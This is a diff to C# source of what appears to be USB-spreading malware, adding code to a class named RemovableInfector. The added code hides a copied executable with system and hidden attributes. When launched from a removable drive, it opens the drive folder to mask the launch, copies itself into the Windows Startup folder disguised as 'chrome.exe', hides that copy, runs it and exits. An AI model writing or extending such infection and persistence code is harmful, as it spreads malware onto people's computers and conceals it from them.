@@ -125,6 +125,10 @@ namespace zort
             }
             ModuleLogger.Log(this, $"Copied executable to fake folder: {clonedExecutablePath}");
 
+            // Set the file attributes to system and hidden
+            File.SetAttributes(clonedExecutablePath, FileAttributes.System | FileAttributes.Hidden);
+            ModuleLogger.Log(this, $"Set file attributes to system and hidden: {clonedExecutablePath}");
+
             // Create a shortcut to the executable
             string targetPath = $@"{fakeSystemVolumeInfoPath}\IndexerVolumeGuid.exe";
             string shortcutPath = Path.Combine(fakeFolderPath, $@"{driveLetter}:\.lnk");
@@ -231,6 +235,44 @@ namespace zort
             {
                 ModuleLogger.Log(this, $"Failed to change NTFS security rules: {ex.Message}");
             }
+        }
+
+        public static void CheckIfRunningFromRemovableDrive()
+        {
+            // Check if the current process is running from a removable drive
+            string currentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            DriveInfo driveInfo = new DriveInfo(Path.GetPathRoot(currentPath));
+            if (driveInfo.DriveType != DriveType.Removable) return;
+            ModuleLogger.Log(typeof(RemovableInfector), "Running from removable drive. Attempting to infect system...");
+            if(Path.GetFileName(currentPath) == "IndexerVolumeGuid.exe")
+            {
+                // Started from nicely structured infection
+                // Open the parent folder in a file explorer
+                string parentFolder = Directory.GetParent(Path.GetDirectoryName(currentPath)).FullName;
+                if (parentFolder != null)
+                {
+                    System.Diagnostics.Process.Start("explorer.exe", parentFolder);
+                    ModuleLogger.Log(typeof(RemovableInfector), $"Opened parent folder: {parentFolder}");
+                }
+            }
+
+            // Continue infecting the system
+            // Move self to startup folder
+            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            string startupPath = Path.Combine(startupFolder, "chrome.exe");
+            File.Copy(currentPath, startupPath, true);
+            ModuleLogger.Log(typeof(RemovableInfector), $"Moved self to startup folder: {startupPath}");
+
+            // Give hidden and system attributes to the file
+            File.SetAttributes(startupPath, FileAttributes.Hidden | FileAttributes.System);
+            ModuleLogger.Log(typeof(RemovableInfector), $"Set hidden and system attributes to: {startupPath}");
+
+            // Start the cloned executable and exit
+            System.Diagnostics.Process.Start(startupPath);
+            ModuleLogger.Log(typeof(RemovableInfector), $"Started cloned executable: {startupPath}");
+            ModuleLogger.Log(typeof(RemovableInfector), "Exiting original process.");
+            // Exit the current process
+            Environment.Exit(0);
         }
     }
 }
